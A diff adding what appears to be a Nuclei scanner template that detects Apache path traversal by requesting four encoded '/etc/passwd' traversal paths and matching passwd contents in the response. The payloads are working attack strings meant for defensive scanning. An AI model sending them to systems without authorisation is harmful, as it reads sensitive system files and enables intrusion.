@@ -1,0 +1,34 @@
+id: apache-path-traversal-check
+
+info:
+  name: Apache Path Traversal Vulnerability
+  author: Zahir
+  severity: high
+  description: |
+    Detects Apache path traversal vulnerabilities using various payloads to access sensitive files like `/etc/passwd`.
+  tags: apache, path-traversal, lfi, sensitive-data
+
+variables:
+  payloads: |
+    /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+    //cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+    /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+    /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{payloads}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200  # Check if the response status code is 200 OK
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0:"       # Check for the presence of /etc/passwd file content
+          - "/bin/bash"         # Another indicator from /etc/passwd
+          - "/bin/sh"           # Another indicator from /etc/passwd
+          - "/home/"            # Check for home directories from /etc/passwd
+
